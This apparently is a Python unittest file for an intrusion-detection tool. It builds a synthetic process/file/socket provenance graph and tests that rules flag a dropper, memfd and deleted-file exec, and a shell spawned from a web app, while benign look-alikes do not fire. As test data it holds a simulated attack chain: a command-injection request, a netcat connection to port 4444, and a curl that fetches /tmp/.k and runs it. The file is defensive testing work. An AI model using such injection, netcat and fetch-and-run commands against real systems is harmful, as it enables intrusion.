# SPDX-License-Identifier: MIT
"""p15.graph.rules and p15.graph.story on a hand-made graph: the demo's attack, and benign look-alikes
each rule must not fire on."""

import sys
import unittest
from pathlib import Path

import duckdb

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from p15.graph import rules as RL  # noqa: E402
from p15.graph import story as ST  # noqa: E402

S = 1_000_000_000

SCHEMA = """
CREATE TABLE node (node_id BIGINT, kind VARCHAR, key VARCHAR, first_ns UBIGINT);
CREATE TABLE proc (node_id BIGINT, tgid UINTEGER, start_ns UBIGINT, parent_node BIGINT, fork_ns UBIGINT,
                   exit_ns UBIGINT, cmd VARCHAR, comm VARCHAR);
CREATE TABLE proc_image (node_id BIGINT, image_no UINTEGER, ts_ns UBIGINT, seen_in VARCHAR, filename VARCHAR,
                         cmd VARCHAR, backing VARCHAR);
CREATE TABLE file (node_id BIGINT, key VARCHAR, path VARCHAR, name VARCHAR, kind VARCHAR);
CREATE TABLE sock (node_id BIGINT, laddr VARCHAR, lport INTEGER, raddr VARCHAR, rport INTEGER);
CREATE TABLE edge (edge_id BIGINT, ts_ns UBIGINT, src BIGINT, dst BIGINT, op VARCHAR, ok BOOLEAN, access VARCHAR,
                   end_ns UBIGINT, bytes UBIGINT);
CREATE TABLE sock_pair (client_node BIGINT, server_node BIGINT);
CREATE TABLE file_backing (real_node BIGINT, user_node BIGINT);
"""


class G:
    """A tiny graph builder: nodes get ids in order; edges at whole seconds."""

    def __init__(self):
        self.con = duckdb.connect()
        self.con.execute(SCHEMA)
        self.n = 0
        self.e = 0

    def proc(self, tgid, comm, cmd, t, parent=None, images=()):
        self.n += 1
        nid = self.n
        self.con.execute("INSERT INTO node VALUES (?, 'proc', ?, ?)", [nid, f"p:{tgid}:{t * S}", t * S])
        self.con.execute("INSERT INTO proc VALUES (?, ?, ?, ?, ?, NULL, ?, ?)",
                         [nid, tgid, t * S, parent, t * S if parent else None, cmd, comm])
        for i, (fn, backing) in enumerate(images):
            self.con.execute("INSERT INTO proc_image VALUES (?, ?, ?, 'exec', ?, ?, ?)", [nid, i, t * S, fn, cmd, backing])
        if parent:
            self.edge(t, parent, nid, "CLONE")
        return nid

    def file(self, path, t=0):
        self.n += 1
        self.con.execute("INSERT INTO node VALUES (?, 'file', ?, ?)", [self.n, f"t:1:0:{self.n}:1", t * S])
        self.con.execute("INSERT INTO file VALUES (?, ?, ?, NULL, 'file')", [self.n, f"t:1:0:{self.n}:1", path])
        return self.n

    def sock(self, lp, rp, t=0):
        self.n += 1
        self.con.execute("INSERT INTO node VALUES (?, 'sock', ?, ?)", [self.n, f"s:{self.n}", t * S])
        self.con.execute("INSERT INTO sock VALUES (?, '127.0.0.1', ?, '127.0.0.1', ?)", [self.n, lp, rp])
        return self.n

    def edge(self, t, src, dst, op, access=None, ok=True, nbytes=None):
        self.e += 1
        ts = int(t * S)
        self.con.execute("INSERT INTO edge VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)", [self.e, ts, src, dst, op, ok, access, ts, nbytes])


def demo():
    """The demo's story: curl -> web app (accept) -> sh; sh -> nc (connect to 4444); sh -> curl
    writes /tmp/.k; sh -> .k runs it; sh -> sh -> python3 -> memfd exec and deleted exec. And noise:
    a benign lookup shell of the same web app, a compiler-like writer whose output nobody runs."""
    g = G()
    sh_bin, py_bin, nc_bin, curl_bin = g.file("/bin/sh"), g.file("/usr/bin/python3"), g.file("/usr/bin/nc"), g.file("/usr/bin/curl")
    libc = g.file("/usr/lib/x86_64-linux-gnu/libc.so.6")
    bash = g.proc(100, "bash", "bash run_demo.sh", 1)
    app = g.proc(101, "python3", "python3 webapp.py 8080", 2, bash, [("/usr/bin/python3", "disk")])
    g.edge(2, py_bin, app, "EXECUTE")
    g.edge(2, libc, app, "OPEN", "r")
    cli = g.proc(102, "curl", "curl http://127.0.0.1:8080/lookup?name=x", 3, bash)
    cs, ss = g.sock(36736, 8080, 3), g.sock(8080, 36736, 3)
    g.edge(3, cli, cs, "CONNECT")
    g.edge(3, ss, app, "ACCEPT")
    g.con.execute("INSERT INTO sock_pair VALUES (?, ?)", [cs, ss])
    benign = g.proc(103, "sh", "/bin/sh -c getent hosts localhost", 3.5, app, [("/bin/sh", "disk")])
    pipe = g.file("pipe:[1]", 3.5)
    g.edge(3.6, benign, pipe, "WRITE", nbytes=20)   # the lookup's output back to the app (as on the VM)
    g.edge(3.7, pipe, app, "READ", nbytes=20)
    attacker = g.proc(118, "curl", "curl http://127.0.0.1:8080/lookup?name=x;nc ...", 3.85, bash)
    cs2, ss2 = g.sock(55486, 8080, 3.9), g.sock(8080, 55486, 3.9)
    g.edge(3.9, attacker, cs2, "CONNECT")
    g.edge(3.9, attacker, cs2, "SEND", nbytes=99)
    g.edge(3.9, ss2, app, "ACCEPT")
    g.edge(3.91, ss2, app, "RECV", nbytes=99)
    g.con.execute("INSERT INTO sock_pair VALUES (?, ?)", [cs2, ss2])
    sh = g.proc(104, "sh", "/bin/sh -c getent hosts localhost;nc ...", 4, app, [("/bin/sh", "disk")])
    g.edge(4, sh_bin, sh, "EXECUTE")
    nc = g.proc(105, "nc", "nc -w1 127.0.0.1 4444", 4.1, sh, [("/usr/bin/nc", "disk")])
    g.edge(4.1, nc_bin, nc, "EXECUTE")
    c2c, c2s = g.sock(44426, 4444, 4.2), g.sock(4444, 44426, 4.2)
    catcher = g.proc(99, "nc", "nc -l 127.0.0.1 4444", 1.5, bash, [("/usr/bin/nc", "disk")])
    g.edge(4.2, nc, c2c, "CONNECT")
    g.edge(4.25, c2s, catcher, "ACCEPT")
    g.con.execute("INSERT INTO sock_pair VALUES (?, ?)", [c2c, c2s])
    dl = g.proc(106, "curl", "curl -s http://127.0.0.1:8000/k -o /tmp/.k", 5, sh, [("/usr/bin/curl", "disk")])
    g.edge(5, curl_bin, dl, "EXECUTE")
    k = g.file("/tmp/.k", 5)
    g.edge(5.1, dl, k, "WRITE", nbytes=40000)
    g.edge(5.0, k, dl, "OPEN", "w")
    run_k = g.proc(107, ".k", "/tmp/.k", 5.5, sh, [("/tmp/.k", "tmpfs")])
    g.edge(5.5, k, run_k, "EXECUTE")
    sh2 = g.proc(108, "sh", "sh", 6, sh, [("/bin/sh", "disk")])
    py = g.proc(109, "python3", "python3 -", 6.1, sh2, [("/usr/bin/python3", "disk")])
    mem = g.proc(110, "3", "kworker", 6.2, py, [("/proc/self/fd/3", "memory")])
    dele = g.proc(111, "4", "upd", 6.3, py, [("/proc/self/fd/4", "deleted")])
    # look-alikes that must not fire: a file written and run by the same process, a file run before
    # it was written, a shell started by a process with no network input, a denied write
    cc = g.proc(112, "cc", "cc -o a.out", 7, bash)
    out = g.file("/var/tmp/a.out", 7)
    g.edge(7, cc, out, "WRITE")
    g.edge(7.5, out, cc, "EXECUTE")
    early = g.file("/var/tmp/b.out", 1)
    runner = g.proc(113, "b.out", "b.out", 8, bash, [("/var/tmp/b.out", "disk")])
    g.edge(8, early, runner, "EXECUTE")
    late_writer = g.proc(114, "cp", "cp x b.out", 9, bash)
    g.edge(9, late_writer, early, "WRITE")
    quiet_sh = g.proc(115, "sh", "sh -c true", 10, bash, [("/bin/sh", "disk")])
    denied = g.file("/var/tmp/c.out", 11)
    w2 = g.proc(116, "x", "x", 11, bash)
    g.edge(11, denied, w2, "OPEN", "w", ok=False)
    r2 = g.proc(117, "c.out", "c.out", 12, bash, [("/var/tmp/c.out", "disk")])
    g.edge(12, denied, r2, "EXECUTE")
    return g, dict(app=app, benign=benign, sh=sh, nc=nc, catcher=catcher, run_k=run_k, mem=mem, dele=dele,
                   quiet_sh=quiet_sh, cc=cc, runner=runner, r2=r2, libc=libc, k=k, cs=cs, ss=ss, c2c=c2c, c2s=c2s, bash=bash,
                   attacker=attacker, cs2=cs2, ss2=ss2, pipe=pipe)


class Rules(unittest.TestCase):
    def setUp(self):
        self.g, self.n = demo()
        self.alerts = RL.run(self.g.con)

    def nodes(self, rule):
        return [a.node for a in self.alerts if a.rule == rule]

    def test_dropper(self):
        self.assertEqual(self.nodes("R1"), [self.n["run_k"]], "only /tmp/.k: written by curl, run by another process")
        self.assertIn("/tmp/.k", [a for a in self.alerts if a.rule == "R1"][0].detail)

    def test_memory_and_deleted(self):
        self.assertEqual(self.nodes("R2"), [self.n["mem"]])
        self.assertEqual(self.nodes("R3"), [self.n["dele"]])

    def test_net_shell_names_the_request_that_led_to_it(self):
        d = {a.node: a.detail for a in self.alerts if a.rule == "R4"}
        self.assertIn("55486", d[self.n["sh"]], "the injected shell: the connection accepted just before it")
        self.assertIn("36736", d[self.n["benign"]], "the lookup's shell: the earlier connection")

    def test_net_shell(self):
        self.assertEqual(sorted(self.nodes("R4")), sorted([self.n["benign"], self.n["sh"]]),
                         "both of the web app's shells fire, the quiet shell and the nested sh do not")
        self.assertNotIn(self.n["quiet_sh"], self.nodes("R4"))

    def test_shell_before_network_input_does_not_fire(self):
        # the benign shell forked at 3.5 s, after the accept at 3 s; forked at 2 s, before it, it does not fire
        self.assertEqual(self.nodes("R4").count(self.n["benign"]), 1)
        self.g.con.execute("UPDATE proc SET fork_ns = 2 * ? WHERE node_id = ?", [S, self.n["benign"]])
        self.assertNotIn(self.n["benign"], [a.node for a in RL.run(self.g.con) if a.rule == "R4"])

    def test_time_order(self):
        ts = [a.ts_ns for a in self.alerts]
        self.assertEqual(ts, sorted(ts))


class Story(unittest.TestCase):
    def setUp(self):
        self.g, self.n = demo()

    def test_picks_the_shell_that_leads_somewhere(self):
        start, _ = ST.pick_start(self.g.con, None, "R4")
        self.assertEqual(start, self.n["sh"], "of two R4 alerts, the one whose own children set off R1, R2 and R3, "
                                              "though the harmless shell's output reaches them too, through the app")

    def test_path(self):
        s = ST.build(self.g.con, self.n["sh"], 10.0)
        kept = s["kept"]
        for k in ("app", "sh", "nc", "catcher", "run_k", "mem", "dele", "k", "attacker", "cs2", "ss2", "c2c", "c2s"):
            self.assertIn(self.n[k], kept, k)
        for k in ("benign", "pipe", "cs", "ss", "cc", "libc"):
            self.assertNotIn(self.n[k], kept, f"{k}: an earlier influence off the cause chain, or noise, or unrelated")
        ops = {(src, dst, op) for _t, _e, src, dst, op, _c, _b in s["edges"]}
        self.assertIn((self.n["k"], self.n["run_k"], "EXECUTE"), ops)
        self.assertIn((self.n["nc"], self.n["c2c"], "CONNECT"), ops)
        self.assertTrue(all(t >= s["t0"] for t, *_ in s["edges"]), "what it led to starts at the start")
        text = ST.text(s, RL.run(self.g.con))
        for want in ("R1 dropper", "R2 memfd-exec", "R3 deleted-exec", "proc 110 3 [kworker]", "==TCP==", "why it happened"):
            self.assertIn(want, text)
        html = ST.page(s, RL.run(self.g.con), "t")
        self.assertTrue(html.startswith("<!DOCTYPE html>") and "R2 memfd-exec" in html and "Why it happened" in html)

    def test_why_chain_follows_the_request_that_led_to_the_shell(self):
        s = ST.build(self.g.con, self.n["sh"], 10.0)
        steps = [(src, dst, op) for _t, src, dst, op in s["why"]]
        self.assertEqual(steps[:5], [(self.n["app"], self.n["sh"], "CLONE"),
                                     (self.n["ss2"], self.n["app"], "RECV"),
                                     (self.n["cs2"], self.n["ss2"], "TCP"),
                                     (self.n["attacker"], self.n["cs2"], "SEND"),
                                     (self.n["bash"], self.n["attacker"], "CLONE")],
                         "shell <- web app <- the request's socket <- its client <- the client's parent")

    def test_window_bounds_the_chain(self):
        wide = ST.build(self.g.con, self.n["sh"], 60.0)
        narrow = ST.build(self.g.con, self.n["sh"], 0.05)
        self.assertIn(self.n["bash"], wide["kept"])
        self.assertNotIn(self.n["attacker"], narrow["kept"], "a cause older than the window ends the chain")
        self.assertEqual([st[3] for st in narrow["why"]], ["CLONE"])

    def test_labels_name_pipes_and_what_an_exec_was_called_as(self):
        g = self.g
        g.con.execute("UPDATE file SET path = NULL, kind = 'pipe' WHERE node_id = ?", [self.n["pipe"]])
        multi = g.file("/usr/lib/cargo/bin/coreutils/tee", 4)
        chm = g.proc(119, "chmod", "chmod +x /tmp/.k", 5.2, self.n["sh"], [("/usr/bin/chmod", "disk")])
        g.edge(5.2, multi, chm, "EXECUTE")
        s = ST.build(g.con, self.n["sh"], 10.0)
        text = ST.text(s, [])
        self.assertIn("file /usr/lib/cargo/bin/coreutils/tee  --EXECUTE-->  proc 119 chmod  (as /usr/bin/chmod)", text)
        self.assertNotIn("(as /usr/bin/nc)", text, "no note when the file's name is the exec's")
        s2 = ST.build(g.con, self.n["benign"], 10.0)
        self.assertIn("file (pipe) ", " ".join(s2["labels"].values()))

    def test_story_document_agrees_with_the_text_read_back(self):
        """story.doc (from the graph) and p15.graph.viewer.from_text (from story.text) are the two ways
        into the storybook: for the same path they must hold the same nodes, steps, edges and alerts."""
        from p15.graph import viewer as V
        alerts = RL.run(self.g.con)
        s = ST.build(self.g.con, self.n["sh"], 10.0)
        live = ST.doc(s, alerts, "g.duckdb")
        back = V.from_text(ST.text(s, alerts))
        sh = {n["id"]: n["short"] for n in live["nodes"]}

        def t3(t):
            return None if t is None else f"{t:+.3f}"

        self.assertEqual(sorted(sh.values()), sorted(n["id"] for n in back["nodes"]))
        self.assertEqual(live["counts"], back["counts"])
        self.assertEqual(sh[live["start"]], back["start"])
        self.assertEqual([(t3(w["t"]), sh[w["src"]], sh[w["dst"]], w["op"]) for w in live["why"]],
                         [(t3(w["t"]), w["src"], w["dst"], w["op"]) for w in back["why"]])
        self.assertEqual([(t3(e["t"]), sh[e["src"]], sh[e["dst"]], e["op"], e["count"], e["bytes"], e["called_as"])
                          for e in live["edges"]],
                         [(t3(e["t"]), e["src"], e["dst"], e["op"], e["count"], e["bytes"], e["called_as"])
                          for e in back["edges"]])
        self.assertEqual(sorted((sh[p["client"]], sh[p["server"]]) for p in live["pairs"]),
                         sorted((p["client"], p["server"]) for p in back["pairs"]))
        self.assertEqual([(a["rule"], a["detail"], sh[a["node"]]) for a in live["alerts"] if a["on_path"]],
                         [(a["rule"], a["detail"], a["node"]) for a in back["alerts"]])
        self.assertGreater(len(live["edges"]), 5)
        self.assertTrue(any(not a["on_path"] for a in live["alerts"]))   # the benign shell's R4, off the path
        self.assertIn('id="story-data"', V.render(live))

    def test_short_labels(self):
        self.assertEqual(ST.short("proc 7 nc (nc -w1 x)"), "proc 7 nc")
        self.assertEqual(ST.short("proc 422 3 (kworker)"), "proc 422 3 [kworker]")
        self.assertEqual(ST.short("file /tmp/x"), "file /tmp/x")


if __name__ == "__main__":
    unittest.main()
